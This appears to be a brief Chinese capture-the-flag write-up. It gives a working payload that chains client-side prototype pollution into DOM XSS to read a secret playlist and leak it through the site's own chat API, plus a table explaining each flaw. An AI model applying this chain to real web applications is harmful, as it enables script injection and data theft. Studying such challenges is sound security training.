# FLAG 怪盗团·三

## Payload

```javascript
?__proto__[customHtml]=<img src=x onerror="fetch('/api/room/secret-playlist').then(r=>r.json()).then(d=>fetch('/api/danmu/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sender:'Hacker',text:'当前歌曲是: '%2Bd.current_song})}))">
```

## 漏洞点

| 位置 | 说明 |
| --- | --- |
| `js/main.js` | `mergeParams()` 按 `?a[b]=c` 递归合并进 `roomConfig`，`__proto__` 未过滤 → 客户端原型链污染 |
| `js/main.js` | `window.displayConfig \|\| {}` 拿到的空对象继承了被污染的原型 → `customHtml` 落到 `innerHTML`（DOM XSS） |
| `index.html` | CSP 含 `'unsafe-inline'`，内联事件处理器可用；`connect-src 'self'` 逼着用站内接口带出歌名 |
